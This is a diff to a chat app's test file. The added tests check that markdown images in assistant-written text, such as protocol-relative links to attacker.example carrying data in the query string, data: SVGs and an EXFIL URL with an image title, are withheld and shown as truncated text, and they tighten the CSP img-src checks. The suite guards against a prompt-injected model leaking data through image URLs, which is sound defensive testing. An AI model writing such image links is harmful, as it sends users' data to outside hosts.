@@ -45,6 +45,40 @@ describe("markdown images in assistant text", () => {
     const { container } = render(<MessageView m={msg("assistant", `![pixel][x]\n\n[x]: ${EXFIL}`)} />);
     expect(container.querySelectorAll("img")).toHaveLength(0);
   });
+
+  it("discloses a protocol-relative target as raw text when there is no hostname", () => {
+    const src = "//attacker.example/p.png?d=case";
+    const { container } = render(<MessageView m={msg("assistant", `![pixel](${src})`)} />);
+    expect(container.querySelectorAll("img")).toHaveLength(0);
+    const marker = container.querySelector(".chat-blocked-image");
+    expect(marker?.textContent).toContain("//attacker.example/p.png");
+    expect(container.querySelector("a")).toBeNull();
+  });
+
+  it("truncates a long target so a disclosure line cannot balloon the message", () => {
+    const src = `//attacker.example/p.png?d=${"A".repeat(400)}`;
+    const { container } = render(<MessageView m={msg("assistant", `![pixel](${src})`)} />);
+    expect(container.querySelectorAll("img")).toHaveLength(0);
+    const text = container.querySelector(".chat-blocked-image")?.textContent ?? "";
+    expect(text).toContain("//attacker.example/p.png?d=");
+    expect(text).toContain("…");
+    expect(text.length).toBeLessThan(160);
+  });
+
+  it("a data: image is withheld; react-markdown drops the scheme before the renderer sees it", () => {
+    const src = `data:image/svg+xml;base64,${"A".repeat(40)}`;
+    const { container } = render(<MessageView m={msg("assistant", `![seal](${src})`)} />);
+    expect(container.querySelectorAll("img")).toHaveLength(0);
+    expect(container.querySelector(".chat-blocked-image")?.textContent).toContain("seal");
+    expect(container.innerHTML).not.toContain("data:image");
+  });
+
+  it("surfaces the image title, which is part of what the model wrote", () => {
+    const { container } = render(
+      <MessageView m={msg("assistant", `![pixel](${EXFIL} "see appended data")`)} />,
+    );
+    expect(container.querySelector(".chat-blocked-image")?.textContent).toContain("see appended data");
+  });
 });
 
 describe("the analyst's own uploads", () => {
@@ -63,14 +97,16 @@ describe("CSP img-src", () => {
     headers: Array<{ headers: Array<{ key: string; value: string }> }>;
   };
   const csp = cfg.headers.flatMap((h) => h.headers).find((h) => h.key === "Content-Security-Policy")?.value ?? "";
-  const imgSrc = (csp.match(/img-src([^;]*)/)?.[1] ?? "").trim().split(/\s+/);
+  // Anchored on the directive boundary so `img-src-elem` or a mid-token match
+  // cannot satisfy it; the full source list is asserted so a loosened policy
+  // (an extra wildcard, scheme or host) fails rather than slipping past.
+  const imgSrc = (csp.match(/(?:^|;\s*)img-src\s+([^;]*)/)?.[1] ?? "").trim().split(/\s+/).sort();
 
-  it("no longer allows any https: image host", () => {
-    expect(imgSrc).not.toContain("https:");
-    expect(imgSrc).not.toContain("*");
+  it("is exactly self, data:, blob: and Supabase Storage — nothing wider", () => {
+    expect(imgSrc).toEqual(["'self'", "blob:", "data:", "https://*.supabase.co"]);
   });
 
-  it("still allows Supabase Storage, data: and blob:", () => {
-    expect(imgSrc).toEqual(expect.arrayContaining(["'self'", "data:", "blob:", "https://*.supabase.co"]));
+  it("has no img-src-elem or img-src-attr directive widening it", () => {
+    expect(csp).not.toMatch(/img-src-(elem|attr)/);
   });
 });
